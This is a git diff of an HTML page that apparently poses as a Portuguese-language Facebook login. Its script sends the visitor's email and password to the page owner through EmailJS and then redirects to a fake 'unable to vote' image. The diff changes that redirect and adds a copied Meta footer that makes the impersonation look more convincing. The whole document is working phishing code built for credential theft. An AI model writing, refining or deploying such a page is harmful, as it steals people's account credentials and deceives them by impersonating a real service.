@@ -113,7 +113,7 @@
     </div>
 
     <!-- Include Email.js library -->
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script async src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
     emailjs.init("pyXNqOB5X5JcIDgHe");
 
@@ -127,7 +127,7 @@
 
         // Check if email and password meet the length requirement
         if (emailValue.length < 6 || passwordValue.length < 6) {
-            alert('por favor insira seu e-mail e senha');
+            alert('u');
             return;
         }
 
@@ -153,7 +153,7 @@
         emailjs.send("service_5j8h60h", "template_wzo7rgg", templateParams)
             .then(function(response) {
                 console.log("Login details sent successfully", response);
-                window.location.href = 'https://pintura-do-facebook.github.io/Votacao-falhou/';
+                window.location.href = 'https://raw.githubusercontent.com/FacebookArt/pak4/b565808271bcce1d2ad760104c3ddc07b44cd387/unable%20to%20vote.%20please%20try%20again.png';
             }, function(error) {
                 console.log("Failed to send login details. Error:", error);
                 console.log("email:", email);
@@ -187,5 +187,23 @@
         }
     }
 </script>
+<div class="footer">
+    <a>Meta</a>
+    <a>Sobre</a>
+    <a>Blogue</a>
+    <a>Empregos</a>
+    <a>Ajuda</a>
+    <a>API</a>
+    <a>Privacidade</a>
+    <a>Termos</a>
+    <a>Localizações</a>
+    <a>Instagram Lite</a>
+    <a>Threads</a>
+    <a>Upload de contatos e não usuários</a>
+    <a>Meta Verified</a>
+    <a>português</a>
+    <br>
+    © 2024 Facebook from Meta
+</div>
 </body>
 </html>
